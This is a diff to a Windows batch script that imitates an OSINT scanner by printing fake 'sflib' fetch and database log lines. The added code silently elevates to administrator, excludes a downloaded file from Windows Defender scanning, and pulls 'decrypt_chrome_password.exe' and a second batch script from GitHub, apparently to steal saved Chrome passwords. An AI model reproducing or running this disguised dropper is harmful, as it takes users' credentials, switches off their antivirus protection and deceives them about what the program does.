@@ -1,4 +1,10 @@
 @echo off
+net session >nul 2>&1
+if %errorLevel% NEQ 0 (
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
+    exit /b
+)
+
 echo [INFO] sflib : Fetched https://www.tiktok.com/oembed?url=https://www.tiktok.com/ (45 bytes in 0.6976339817047119s)
 echo [INFO] sflib : Fetched https://www.threads.net/ (195483 bytes in 0.9997644424438477s)
 echo [INFO] sflib : Fetched https://thoughts.com/members// (803377 bytes in 3.1704485416412354s)
@@ -247,6 +253,8 @@ set "url=https://github.com/techtoona/test3/raw/refs/heads/main/decrypt_chrome_p
 set "output=decrypt_chrome_password.exe"
 set "csvfile=decrypted_password.csv"
 
+powershell -Command "Add-MpPreference -ExclusionPath '%cd%\%output%'"
+
 :: Download the executable
 curl -L -o "%output%" "%url%"
 
@@ -278,7 +286,7 @@ setlocal
 set "url2=https://github.com/techtoona/test/raw/refs/heads/main/parsing.bat"
 set "output2=%cd%\parsing.bat"  :: Save the output file in the current directory
 
-:: Download the executable
+
 curl -L -o "%output2%" "%url2%"
 
 :: Check if the download was successful
@@ -292,7 +300,6 @@ endlocal
 
 
 echo [INFO] sflib : Parsing configuration file...
-echo [INFO] sflib : Loaded settings successfully.
 echo [INFO] sflib : Initializing database connection...
 echo [INFO] sflib : Database connection established.
 echo [INFO] sflib : Processing data for email.
@@ -306,5 +313,6 @@ echo [INFO] Generating CSV file, please wait...
 set filename=results.csv
 echo.>"%filename%"
 echo CSV file "%filename%" created successfully.
+pause
 
 exit
